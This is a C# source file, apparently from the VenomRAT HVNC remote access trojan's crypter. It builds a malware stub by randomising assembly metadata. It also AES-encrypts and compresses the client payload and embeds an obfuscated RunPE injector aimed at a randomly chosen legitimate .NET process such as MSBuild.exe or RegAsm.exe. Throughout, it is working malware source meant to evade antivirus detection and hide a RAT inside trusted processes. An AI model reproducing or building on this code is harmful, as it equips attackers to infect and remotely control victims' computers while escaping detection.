using System;
using System.IO;
using Obfuscation;
using VenomRAT_HVNC.Crypter.Algorithms;

namespace VenomRAT_HVNC.Crypter.Other;

public class Replace
{
    public static string Stub(string stub, string pathClient)
    {
        //Assembly
        Random version = new Random();
        stub = stub.Replace("#AssemblyTitle#", new GenerateKey(10).GenerateStrenghCharacter());
        stub = stub.Replace("#AssemblyDescriptions#", new GenerateKey(10).GenerateStrenghCharacter());
        stub = stub.Replace("#AssemblyConfigurations#", new GenerateKey(10).GenerateStrenghCharacter());
        stub = stub.Replace("#AssemblyCompany#", new GenerateKey(10).GenerateStrenghCharacter());
        stub = stub.Replace("#AssemblyProduct#", new GenerateKey(10).GenerateStrenghCharacter());
        stub = stub.Replace("#AssemblyCopyright#", new GenerateKey(10).GenerateStrenghCharacter());
        stub = stub.Replace("#AssemblyTrademark#", new GenerateKey(10).GenerateStrenghCharacter());
        stub = stub.Replace("999", version.Next(0, 1000).ToString());
        stub = stub.Replace("998", version.Next(0, 1000).ToString());
        stub = stub.Replace("997", version.Next(0, 1000).ToString());
        stub = stub.Replace("996", version.Next(0, 1000).ToString());

        //Stub
        byte[] client = File.ReadAllBytes(pathClient);
        string motDePasseAesCompress = new GenerateKey(256).GenerateStrenghCharacter();
        string codeAesCompressPayloadBase64 = Aes.Encrypt(Aes.Compress(client), motDePasseAesCompress);
        stub = stub.Replace("#PASSWORD_AES_COMPRESS_STUB#", motDePasseAesCompress);
        stub = stub.Replace("#PAYLOAD_AES_COMPRESS_STUB#", codeAesCompressPayloadBase64);

        //RunPE
        string[] listeProcessRunpe = new[]
        {
            "MSBuild.exe", //Marche
            "AppLaunch.exe", //Marche
            "RegAsm.exe", //Marche
            "Vbc.exe", //Marche
            "Csc.exe", //Marche
            "RegSvcs.exe", //Marche
            "aspnet_compiler.exe", //Marche
            "ilasm.exe", //Marche
            "cvtres.exe", //Marche
            "InstallUtil.exe", //Marche
            "jsc.exe", //Marche
            "CasPol.exe" //Marche
        };
        Random rand = new Random();
        ObfuscateDll.Run(Settings.FileNameRunPeDllMain, Settings.FileNameRunPeDllTemps);
        string pathProcess = listeProcessRunpe[rand.Next(listeProcessRunpe.Length)];
        string keyRunpe = new GenerateKey(256).GenerateStrenghCharacter();
        string aesCompressRunPeBase64 =
            Aes.Encrypt(Aes.Compress(File.ReadAllBytes(Settings.FileNameRunPeDllTemps)), keyRunpe);
        stub = stub.Replace("#CodeRunPE#", aesCompressRunPeBase64);
        stub = stub.Replace("#PasswordRunPE#", keyRunpe);
        stub = stub.Replace("#PathProcess#", pathProcess);
        stub = stub.Replace("#NamespaceRunpe#", Obfuscation.Settings.NamespaceRunPeObf);
        stub = stub.Replace("#ClassRunpe#", Obfuscation.Settings.ClassRunPeObf);
        stub = stub.Replace("#MethodsRunPE#", Obfuscation.Settings.MethodRunPeObf);


        return stub;
    }
}